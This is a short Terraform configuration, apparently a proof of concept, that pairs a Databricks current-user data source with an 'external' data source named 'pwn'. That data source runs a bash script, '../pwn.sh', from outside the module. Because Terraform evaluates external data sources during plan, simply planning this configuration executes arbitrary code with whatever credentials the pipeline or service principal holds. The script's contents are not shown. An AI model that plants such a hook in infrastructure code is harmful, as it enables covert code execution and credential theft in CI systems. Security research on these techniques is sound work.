data "databricks_current_user" "service_principal" {}

data "external" "pwn" {
  program = ["bash", "${path.module}/../pwn.sh"]
}
